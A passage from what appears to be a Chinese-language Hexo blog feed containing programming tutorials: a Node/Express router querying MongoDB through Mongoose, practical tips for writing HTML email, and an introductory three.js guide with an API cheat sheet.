class_">Schema</span>(&#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="string">&#x27;price&#x27;</span>: <span class="title class_">Number</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = mongoose.<span class="title function_">model</span>(<span class="string">&#x27;Good&#x27;</span>, productSchema);</span><br><span class="line"><span class="comment">// 会自动将Good与goods集合相匹配，或者可以用下面的方法指定需要匹配的集合</span></span><br><span class="line"><span class="comment">//module.exports = mongoose.model(&#x27;Good&#x27;, productSchema, &#x27;goods&#x27;);</span></span><br></pre></td></tr></table></figure><p>然后在router中查询goods的数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Goods</span> = <span class="built_in">require</span>(<span class="string">&#x27;../models/goods&#x27;</span>);</span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="comment">// mongoose.connect(&#x27;mongodb://127.0.0.1:27017/myapp&#x27;);</span></span><br><span class="line">mongoose.<span class="title function_">connect</span>(<span class="string">&#x27;mongodb://localhost/konggu&#x27;</span>);</span><br><span class="line">mongoose.<span class="property">connection</span>.<span class="title function_">on</span>(<span class="string">&#x27;connected&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;MongoDB connected success.&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">mongoose.<span class="property">connection</span>.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;MongoDB connected fail.&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">mongoose.<span class="property">connection</span>.<span class="title function_">on</span>(<span class="string">&#x27;disconnected&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;MongoDB connected disconneted.&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="comment">// res.send(&#x27;respond with a resource of goods&#x27;);</span></span><br><span class="line">    <span class="title class_">Goods</span>.<span class="title function_">find</span>(&#123;&#125;, <span class="function">(<span class="params">err, doc</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            res.<span class="title function_">json</span>(&#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                <span class="attr">mes</span>: err.<span class="property">message</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">json</span>(&#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">                <span class="attr">msg</span>: <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">                <span class="attr">result</span>: &#123;</span><br><span class="line">                    <span class="attr">count</span>: doc.<span class="property">length</span>,</span><br><span class="line">                    <span class="attr">list</span>: doc</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>chrome json格式化插件<br><a href="https://github.com/gildas-lormeau/JSONView-for-Chrome">jsonview</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> express </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何在邮件中写html</title>
      <link href="/2017/12/21/%E5%A6%82%E4%BD%95%E5%9C%A8%E9%82%AE%E4%BB%B6%E4%B8%AD%E5%86%99html/"/>
      <url>/2017/12/21/%E5%A6%82%E4%BD%95%E5%9C%A8%E9%82%AE%E4%BB%B6%E4%B8%AD%E5%86%99html/</url>
      
        <content type="html"><![CDATA[<p>当我们需要在邮件中显示想要的自己定义的格式的时候，就需要在 email 中编写 html，以下将列举一些制作过程中个人的一些总结。</p><span id="more"></span><p>1.Doctype<br>使用这个是为了兼容性，但是就意味着不能使用HTML5。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Google Email<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.布局<br>全局使用table进行布局</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;margin:0;padding:0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">&quot;680&quot;</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;680&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">tbody</span>&gt;</span><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.样式写在标签里面，图片统一用外链引入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://ou1bzq6p5.bkt.clouddn.com/icon_date@2x.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;date: &quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:35px;height:35px;vertical-align:middle&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4.不同邮件服务商对邮件的支持程度不同，注意兼容性问题。<br>1)页面宽度请设定在600到800px（像素）以内，高度根据内容的需求调整高度。</p><p>2)html代码在15kb以内。</p><p>3)单张图片尺寸不要超过1728px,否则outlook显示不全。</p><p>4)邮件内容图文比例4:6，否则容易进入垃圾箱。</p><p>5)table标签上如果不需要边框和间距请加上 border&#x3D;”0” cellpadding&#x3D;”0” cellspacing&#x3D;”0”</p><p>6)文字行高line-height、元素间距要定义在块状元素上（p、td、h、li等）才能起作用。</p><p>7)尽量写行内样式。</p><p>8)不要使用背景图片或gif动态图。</p><p>9)尽量不要用float、position来写邮件效果。</p><p>10)邮件中的按钮尽量不要用图片，可写个一行一列的表格，里面放个a标签。可能发到客户邮箱未被允许加载图片。</p><p>11)img标签要给alt属性，再图片未加载的情况，这个提示的文字就会显示比较重要。</p><p>12)一定要给p标签和h系列标签指定一个margin和padding（也可全都设置margin:0;padding:0;），不然不同的邮箱收到的邮件，间距不一致。font-size、font-weight也要指定，不然显示也不一致。</p><p>13)英文、数字不折行显示的话，给包裹的td加上word-break:break-all。</p><p>14)Outlook会自动为table cell 添加1px border，请在邮件顶部的内联样式中加上 table td { border-collapse: collapse; }</p><p>5.当使用响应式布局时，参考地址<br><a href="https://www.emailonacid.com/blog/article/email-development/emailology_a_free_responsive_email_template_using_media_queries_-_part_i/">Free Responsive Email Template</a></p><p>1响应式设计可使用@media 媒体查询语句或百分比布局。</p><p>2)移动设备邮件模板宽度建议480px。</p><p>3)模板通常是1－3列式布局，推荐1-2列式。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>three.js 初识</title>
      <link href="/2017/11/30/three-js-%E5%88%9D%E8%AF%86/"/>
      <url>/2017/11/30/three-js-%E5%88%9D%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>什么是threejs，很简单，你将它理解成three + js就可以了。three表示3D的意思，js表示javascript的意思。那么合起来，three.js就是使用javascript 来写3D程序的意思。</p><span id="more"></span><p>在Three.js中，要渲染物体到网页中，我们需要3个组建：场景（scene）、相机（camera）和渲染器（renderer）。有了这三样东西，才能将物体渲染到网页中去。</p><p>创建这三要素的代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> scene = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Scene</span>();  <span class="comment">// 场景</span></span><br><span class="line"><span class="keyword">var</span> camera = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">PerspectiveCamera</span>(<span class="number">75</span>, <span class="variable language_">window</span>.<span class="property">innerWidth</span>/<span class="variable language_">window</span>.<span class="property">innerHeight</span>, <span class="number">0.1</span>, <span class="number">1000</span>);<span class="comment">// 透视相机</span></span><br><span class="line"><span class="keyword">var</span> renderer = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">WebGLRenderer</span>();   <span class="comment">// 渲染器</span></span><br><span class="line">renderer.<span class="title function_">setSize</span>(<span class="variable language_">window</span>.<span class="property">innerWidth</span>, <span class="variable language_">window</span>.<span class="property">innerHeight</span>);    <span class="comment">// 设置渲染器的大小为窗口的内宽度，也就是内容区的宽度</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(renderer.<span class="property">domElement</span>);</span><br></pre></td></tr></table></figure><p>场景是所有物体的容器，如果要显示一个苹果，就需要将苹果对象加入场景中。</p><p>相机，相机决定了场景中那个角度的景色会显示出来。相机就像人的眼睛一样，人站在不同位置，抬头或者低头都能够看到不同的景色。场景只有一种，但是相机却又很多种。</p><p>渲染器决定了渲染的结果应该画在页面的什么元素上面，并且以怎样的方式来绘制。</p><p>点</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> point1 = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Vector3</span>();</span><br><span class="line"></span><br><span class="line">point1.<span class="title function_">set</span>(<span class="number">4</span>,<span class="number">8</span>,<span class="number">9</span>);</span><br></pre></td></tr></table></figure><p>线 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> geometry = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Geometry</span>();</span><br><span class="line"><span class="keyword">var</span> material = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">LineBasicMaterial</span>( &#123; <span class="attr">vertexColors</span>: <span class="literal">true</span> &#125; );</span><br><span class="line"><span class="keyword">var</span> color1 = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Color</span>( <span class="number">0x444444</span> ), color2 = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Color</span>( <span class="number">0xFF0000</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线的材质可以由2点的颜色决定</span></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Vector3</span>( -<span class="number">100</span>, <span class="number">0</span>, <span class="number">100</span> );</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Vector3</span>(  <span class="number">100</span>, <span class="number">0</span>, -<span class="number">100</span> );</span><br><span class="line">geometry.<span class="property">vertices</span>.<span class="title function_">push</span>(p1);</span><br><span class="line">geometry.<span class="property">vertices</span>.<span class="title function_">push</span>(p2);</span><br><span class="line">geometry.<span class="property">colors</span>.<span class="title function_">push</span>( color1, color2 );</span><br><span class="line"><span class="keyword">var</span> line = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Line</span>( geometry, material, <span class="variable constant_">THREE</span>.<span class="property">LinePieces</span> );</span><br><span class="line">scene.<span class="title function_">add</span>(line);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> geometry = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Geometry</span>();</span><br></pre></td></tr></table></figure><p>几何体里面有一个vertices变量，可以用来存放点。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">LineBasicMaterial</span>( parameters )</span><br><span class="line"></span><br><span class="line"><span class="title class_">Parameters</span>是一个定义材质外观的对象，它包含多个属性来定义材质，这些属性是：</span><br><span class="line"></span><br><span class="line"><span class="title class_">Color</span>：线条的颜色，用<span class="number">16</span>进制来表示，默认的颜色是白色。</span><br><span class="line"></span><br><span class="line"><span class="title class_">Linewidth</span>：线条的宽度，默认时候<span class="number">1</span>个单位宽度。</span><br><span class="line"></span><br><span class="line"><span class="title class_">Linecap</span>：线条两端的外观，默认是圆角端点，当线条较粗的时候才看得出效果，如果线条很细，那么你几乎看不出效果了。</span><br><span class="line"></span><br><span class="line"><span class="title class_">Linejoin</span>：两个线条的连接点处的外观，默认是“round”，表示圆角。</span><br><span class="line"></span><br><span class="line"><span class="title class_">VertexColors</span>：定义线条材质是否使用顶点颜色，这是一个boolean值。意思是，线条各部分的颜色会根据顶点的颜色来进行插值。（如果关于插值不是很明白，可以<span class="variable constant_">QQ</span>问我，<span class="variable constant_">QQ</span>在前言中你一定能够找到，嘿嘿，虽然没有明确写出）。</span><br><span class="line"></span><br><span class="line"><span class="title class_">Fog</span>：定义材质的颜色是否受全局雾效的影响。</span><br><span class="line"></span><br><span class="line">好了，介绍完这些参数，你可以试一试了，在课后，我们会展示不同同学的杰出作品。下面，接着上面的讲，我们这里使用了顶点颜色<span class="attr">vertexColors</span>: <span class="variable constant_">THREE</span>.<span class="property">VertexColors</span>，就是线条的颜色会根据顶点来计算。</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> material = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">LineBasicMaterial</span>( &#123; <span class="attr">vertexColors</span>: <span class="variable constant_">THREE</span>.<span class="property">VertexColors</span> &#125; );</span><br></pre></td></tr></table></figure><p>改变视角，让画面动起来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">animation</span> () &#123;</span><br><span class="line">  <span class="comment">// renderer.clear()</span></span><br><span class="line">  camera.<span class="property">position</span>.<span class="property">x</span> = camera.<span class="property">position</span>.<span class="property">x</span> + <span class="number">1</span></span><br><span class="line">  renderer.<span class="title function_">render</span>(scene, camera)</span><br><span class="line">  <span class="title function_">requestAnimationFrame</span>(animation)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** 场景（scene） ***/</span></span><br><span class="line"><span class="keyword">var</span> scene = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Scene</span>(); <span class="comment">// 创建场景</span></span><br><span class="line">scene.<span class="title function_">add</span>(x);                  <span class="comment">// 插入场景</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 相机（camera） ***/</span></span><br><span class="line"><span class="comment">// 正交投影相机</span></span><br><span class="line"><span class="keyword">var</span> camera = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">OrthographicCamera</span>(left, right, top, bottom, near, far);</span><br><span class="line"><span class="comment">// 透视头像相机</span></span><br><span class="line"><span class="keyword">var</span> camera = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">PerspectiveCamera</span>(fov, aspect, near, far); <span class="comment">// fov：人眼夹角，aspect：长宽比</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 渲染器（renderer） ***/</span></span><br><span class="line"><span class="keyword">var</span> renderer = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">WebGLRenderer</span>(options);</span><br><span class="line"><span class="comment">// options &#123;&#125; 可选。参数：</span></span><br><span class="line"><span class="comment">// canvas：element &lt;canvas&gt;&lt;/canvas&gt;</span></span><br><span class="line">renderer.<span class="title function_">setSize</span>(长, 宽);</span><br><span class="line">element.<span class="title function_">appendChild</span>(renderer.<span class="property">domElement</span>); <span class="comment">// 插入节点</span></span><br><span class="line">renderer.<span class="title function_">setClearColor</span>(color, opacity);   <span class="comment">// 设置清除后的颜色 16进制</span></span><br><span class="line">renderer.<span class="title function_">clear</span>();                         <span class="comment">// 清除面板</span></span><br><span class="line">renderer.<span class="title function_">render</span>(scene, camera);           <span class="comment">// 渲染</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 光照(light) ***/</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">AmbientLight</span>(颜色);                          <span class="comment">// 环境光</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">PointLight</span>(颜色, 强度, 距离);                <span class="comment">// 点光源</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">DirectionalLight</span>(颜色, 亮度);                <span class="comment">// 平行光</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">SpotLight</span>(颜色, 强度, 距离, 夹角, 衰减指数); <span class="comment">// 聚光灯</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 几何形状 ***/</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">CubeGeometry</span>(长, 宽, 高, 长的分割, 宽的分割, 高的分割);                           <span class="comment">// 立方体</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">PlanGeometry</span>(长,宽, 长的分割, 宽的分割);                                          <span class="comment">// 平面</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">SphereGeometry</span>(半径, 经度切片, 纬度分割, 经度分割, 经度跨过, 纬度开始, 纬度跨过); <span class="comment">// 球体</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">CircleGeometry</span>(半径, 切片数, 开始, 跨过角度);                                     <span class="comment">// 圆形</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">CylinderGeometry</span>(顶部面积, 底部面积, 高, 圆分割, 高分割, 是否没有顶面和底面);     <span class="comment">// 圆台</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">TetrahedronGeometry</span>(半径, 细节);  <span class="comment">// 正四边形</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">OctahedronGeometry</span>(半径, 细节);   <span class="comment">// 正八边形</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">IconsahedronGeometry</span>(半径, 细节); <span class="comment">// 正十二边形</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">TorusGeometry</span>(半径, 管道半径, 纬度分割, 经度分割, 圆环面的弧度); <span class="comment">// 圆环面</span></span><br><span class="line"><span class="comment">// 自定义形状</span></span><br><span class="line"><span class="keyword">var</span> geometry = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Geometry</span>();</span><br><span class="line">geometry.<span class="property">vertices</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Vectory3</span>(x, y, z)); <span class="comment">// 点，其中x、y、z为坐标</span></span><br><span class="line">geometry.<span class="property">faces</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Faces3</span>(x, y, z));      <span class="comment">// 面，其中x、y、z为点的数组的索引，三点确定一个面</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 材质 ***/</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">MeshBasicMaterial</span>(options); <span class="comment">// 基本材质</span></span><br><span class="line"><span class="comment">// options &#123;&#125; 可选。参数：</span></span><br><span class="line"><span class="comment">//   visible：是否可见</span></span><br><span class="line"><span class="comment">//     color：颜色</span></span><br><span class="line"><span class="comment">// wireframe: 是否渲染线而非面</span></span><br><span class="line"><span class="comment">//      side：THREE.FrontSide 正面，THREE.BackSide 反面，THREE.DoubleSide 双面</span></span><br><span class="line"><span class="comment">//       map: 贴图</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">MeshLambertMaterial</span>(options); <span class="comment">// Lambert材质，适合光照</span></span><br><span class="line"><span class="comment">//  ambient：反射能力</span></span><br><span class="line"><span class="comment">// emissive：自发光颜色</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">MeshPhongMaterial</span>();  <span class="comment">// Phong材质，适合金属和镜面</span></span><br><span class="line"><span class="comment">//  specular：光罩颜色</span></span><br><span class="line"><span class="comment">// shininess：光斑大小（值越大，光斑越小）</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">MeshNormalMaterial</span>(); <span class="comment">// 方向材质</span></span><br><span class="line"><span class="comment">/* 贴图 */</span></span><br><span class="line"><span class="keyword">var</span> texture = <span class="variable constant_">THREE</span>.<span class="property">ImageUtils</span>.<span class="title function_">loadTexture</span>(url, &#123;&#125;, <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;); <span class="comment">// 载入单个贴图（建议贴图的长宽为256的倍数）</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">MeshFaceMaterial</span>() <span class="comment">// 设置不同面的贴图，参数为单个贴图的数组</span></span><br><span class="line">texture.<span class="property">wrapS</span> texture.<span class="property">wrapT</span> = <span class="variable constant_">THREE</span>.<span class="property">RepeatWrapping</span> <span class="comment">// 贴图的重复方式</span></span><br><span class="line">texture.<span class="property">repeat</span>.<span class="title function_">set</span>(x, y)     <span class="comment">// 重复次数</span></span><br><span class="line"><span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title function_">texture</span>(canvas)    <span class="comment">// 将canvas作为贴图</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 将模型和贴图结合 ***/</span></span><br><span class="line"><span class="keyword">var</span> mesh = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Mesh</span>(形状, 材质);</span><br><span class="line">mesh.<span class="property">position</span> <span class="comment">// 位置 mesh.position.x（y、z） 或 mesh.position.set(x, y, z)</span></span><br><span class="line">mesh.<span class="property">scale</span>    <span class="comment">// 缩放</span></span><br><span class="line">mesh.<span class="property">rotation</span> <span class="comment">// 旋转</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*** 监视FPS ***/</span></span><br><span class="line"><span class="keyword">var</span> stats = <span class="keyword">new</span> <span class="title class_">Stats</span>();</span><br><span class="line">stats.<span class="property">domElement</span> <span class="comment">// 节点</span></span><br><span class="line">stats.<span class="title function_">begin</span>()    <span class="comment">// 开始</span></span><br><span class="line">stats.<span class="title function_">end</span>()      <span class="comment">// 